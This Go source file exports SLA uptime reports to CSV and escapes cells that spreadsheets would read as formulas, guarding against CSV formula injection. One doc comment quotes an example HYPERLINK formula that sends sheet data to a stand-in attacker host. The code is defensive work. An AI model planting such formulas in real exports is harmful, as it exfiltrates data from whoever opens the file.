package report

import (
	"encoding/csv"
	"io"
	"strconv"
	"time"
)

// SLARow is one monitor's availability line in an SLA report.
type SLARow struct {
	MonitorID   int64
	MonitorName string
	Uptime      UptimeResult
	Percentiles Percentiles
}

// csvSafe neutralises a spreadsheet formula in a cell.
//
// A monitor name is operator-supplied text that ends up in a file someone opens
// in Excel or LibreOffice, and both treat a cell beginning with =, +, - or @ as
// a formula rather than as text. A monitor called
//
//	=HYPERLINK("https://attacker.test?x="&A1,"click")
//
// therefore becomes a live link built from the sheet's own data the moment the
// report is opened. CSV quoting does not help: the quotes are consumed by the
// parser, and the formula character is the first thing left in the cell.
//
// The mitigation is a leading apostrophe, which those applications read as
// "this is text" and do not display. It is applied only to cells that would
// otherwise be interpreted, so an ordinary name passes through untouched. Tab
// and carriage return are included because both are also treated as leading
// whitespace before a formula character.
// CSVSafe is the exported form, used by the audit-log export in internal/api.
// The escape is shared rather than reimplemented there: it is a security
// control, and two copies of a security control drift.
func CSVSafe(v string) string { return csvSafe(v) }

func csvSafe(v string) string {
	if v == "" {
		return v
	}
	switch v[0] {
	case '=', '+', '-', '@', '	', '':
		return "'" + v
	}
	return v
}

// WriteSLACSV writes an SLA report as CSV to w.
func WriteSLACSV(w io.Writer, r Range, rows []SLARow) error {
	cw := csv.NewWriter(w)
	if err := cw.Write([]string{
		"monitor_id", "monitor_name", "from", "to",
		"uptime_percent", "up", "down", "total",
		"p50_ms", "p95_ms", "p99_ms", "avg_ms",
	}); err != nil {
		return err
	}
	for _, row := range rows {
		uptimePct := "n/a"
		if row.Uptime.Uptime >= 0 {
			uptimePct = strconv.FormatFloat(row.Uptime.Uptime*100, 'f', 3, 64)
		}
		rec := []string{
			strconv.FormatInt(row.MonitorID, 10),
			csvSafe(row.MonitorName),
			r.From.UTC().Format(time.RFC3339),
			r.To.UTC().Format(time.RFC3339),
			uptimePct,
			strconv.Itoa(row.Uptime.Up),
			strconv.Itoa(row.Uptime.Down),
			strconv.Itoa(row.Uptime.Total),
			strconv.Itoa(row.Percentiles.P50),
			strconv.Itoa(row.Percentiles.P95),
			strconv.Itoa(row.Percentiles.P99),
			strconv.Itoa(row.Percentiles.Avg),
		}
		if err := cw.Write(rec); err != nil {
			return err
		}
	}
	cw.Flush()
	return cw.Error()
}
